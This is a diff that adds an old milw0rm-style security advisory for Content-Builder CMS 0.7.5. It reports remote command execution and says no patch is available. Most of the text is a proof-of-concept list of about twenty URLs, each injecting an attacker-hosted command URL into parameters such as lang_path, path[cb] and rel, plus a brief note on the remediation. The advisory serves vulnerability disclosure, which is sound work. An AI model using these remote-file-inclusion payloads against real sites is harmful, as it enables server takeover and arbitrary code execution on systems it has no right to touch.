@@ -1,0 +1,48 @@
+-----------------------------------------------------
+Advisory id: FSA:012
+
+Author:    Federico Fazzi
+Date:      11/06/2006, 22:30
+Sinthesis: Content-Builder (CMS) 0.7.5, Remote command execution
+Type:      high
+Product:   http://www.content-builder.de/
+Patch:     unavailable
+-----------------------------------------------------
+
+
+1) Description:
+
+vulnerables page:
+
+Multiple vulnerabilities, see poc.
+
+2) Proof of concept:
+
+http://example/[cb_path]/cms/plugins/col_man/column.inc.php?lang_path=[cmd_url]/
+http://example/[cb_path]/cms/plugins/poll/poll.inc.php?lang_path=[cmd_url]/
+http://example/[cb_path]/cms/plugins/user_managment/usrPortrait.inc.php?lang_path=[cmd_url]/
+http://example/[cb_path]/cms/plugins/user_managment/user.inc.php?lang_path=[cmd_url]/
+http://example/[cb_path]/cms/plugins/media_manager/media.inc.php?lang_path=[cmd_url]/
+http://example/[cb_path]/cms/plugins/events/permanent.eventMonth.inc.php?lang_path=[cmd_url]/
+http://example/[cb_path]/cms/plugins/events/events.inc.php?lang_path=[cmd_url]/
+http://example/[cb_path]/cms/plugins/newsletter2/newsletter.inc.php?lang_path=[cmd_url]/
+http://example/[cb_path]/modules/guestbook/guestbook.inc.php?path[cb]=[cmd_url]/
+http://example/[cb_path]/modules/shoutbox/shoutBox.php?path[cb]=[cmd_url]/
+http://example/[cb_path]/modules/download/overview.inc.php?rel=[cmd_url]/
+http://example/[cb_path]/modules/download/detailView.inc.php?rel=[cmd_url]/
+http://example/[cb_path]/modules/sitemap/sitemap.inc.php?path[cb]=[cmd_url]/
+http://example/[cb_path]/modules/article/fullarticle.inc.php?rel=[cmd_url]/
+http://example/[cb_path]/modules/article/comments.inc.php?rel=[cmd_url]/
+http://example/[cb_path]/modules/article2/overview.inc.php?rel=[cmd_url]/
+http://example/[cb_path]/modules/article2/fullarticle.inc.php?rel=[cmd_url]/
+http://example/[cb_path]/modules/article2/comments.inc.php?rel=[cmd_url]/
+http://example/[cb_path]/modules/headline/headlineBox.php?rel=[cmd_url]/
+http://example/[cb_path]/modules/headline/showHeadline.inc.php?rel=[cmd_url]/
+
+(note: add a cmd url with final slash (/))
+
+3) Solution:
+
+sanitized all variables on all files.
+
+# milw0rm.com [2006-06-11]
